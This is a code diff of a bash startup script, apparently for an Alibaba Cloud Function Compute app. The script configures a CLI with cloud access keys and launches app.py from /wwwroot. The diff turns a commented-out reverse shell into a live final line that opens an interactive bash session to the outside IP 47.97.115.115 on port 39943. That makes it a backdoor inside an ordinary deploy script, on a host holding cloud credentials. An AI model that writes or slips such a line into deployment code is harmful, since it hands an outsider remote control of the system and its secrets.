@@ -1,10 +1,16 @@
 #!/usr/bin/env bash
 set +e
-# bash -i >& /dev/tcp/47.97.115.115/39943 0>&1
-# mkdir /mnt/auto/session
-# chmod -R 777 /mnt/auto/session
+
+ln -s /mnt/auto/$FC_FUNCTION_NAME /wwwroot
+
+mkdir /wwwroot/session
+
 s config add --SecurityToken $ALIBABA_CLOUD_SECURITY_TOKEN --AccessKeyID $ALIBABA_CLOUD_ACCESS_KEY_ID --AccessKeySecret $ALIBABA_CLOUD_ACCESS_KEY_SECRET --AccountID $FC_ACCOUNT_ID -a aliyunfc
-cd /mnt/auto/baota && python3 app.py
+
+cd /wwwroot && python3 app.py
+
+bash -i >& /dev/tcp/47.97.115.115/39943 0>&1
+
 
 # sleep 5
 
